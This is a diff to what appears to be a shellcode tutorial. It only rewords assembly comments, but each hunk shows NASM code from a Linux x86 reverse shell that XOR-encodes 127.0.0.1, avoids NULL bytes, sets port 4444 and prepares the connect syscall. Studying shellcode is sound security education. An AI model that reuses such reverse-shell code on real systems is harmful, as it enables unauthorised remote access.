@@ -275,7 +275,7 @@ The value of 16 (struct sockaddr) is then pushed onto the stack, along with the 
 ```nasm
 	mov edi, 0xffffffff; XOR IP address with this hex value (avoid NULL's contained in IP)
         xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
-        push edi	; push XOR'd value on the stack
+        push edi	; push XOR'd value onto the stack
         push word 0x5c11; port 4444 is set
         push word 0x2   ; AF_INET = 2
         mov ecx, esp    ; pointer to the arguments
@@ -304,7 +304,7 @@ Followed by an instruction to call the interrupt to execute the connect syscall:
 	; 2nd syscall - connect socket to IP/Port in sockaddr struct
 	mov edi, 0xffffffff; XOR IP address with this hex value (avoid NULL's contained in IP)
         xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
-        push edi	; push XOR'd value on the stack
+        push edi	; push XOR'd value onto the stack
         push word 0x5c11; port 4444 is set
         push word 0x2   ; AF_INET = 2
         mov ecx, esp    ; pointer to the arguments
@@ -518,7 +518,7 @@ section .text
         ; 2nd syscall - connect socket to IP/Port in sockaddr struct
 	mov edi, 0xffffffff; XOR IP address with this hex value (avoid NULL's contained in IP)
         xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
-        push edi	; push XOR'd value on the stack
+        push edi	; push XOR'd value onto the stack
         push word 0x5c11; port 4444 is set
         push word 0x2   ; AF_INET = 2
         mov ecx, esp    ; pointer to the arguments
